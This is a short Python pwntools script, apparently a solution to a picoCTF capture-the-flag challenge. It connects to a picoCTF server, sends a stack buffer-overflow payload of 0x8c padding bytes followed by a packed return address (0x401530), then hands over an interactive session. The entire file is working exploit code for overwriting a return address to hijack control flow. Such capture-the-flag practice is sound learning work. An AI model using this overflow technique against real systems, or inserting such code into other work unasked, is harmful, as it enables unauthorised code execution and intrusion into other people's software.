from pwn import *

r = remote("saturn.picoctf.net", 50417)
# r = process("./vuln.exe")
r.recvline()

raw_input()
payload = b'a'*0x8c + p32(0x401530)
r.sendline(payload)

r.interactive()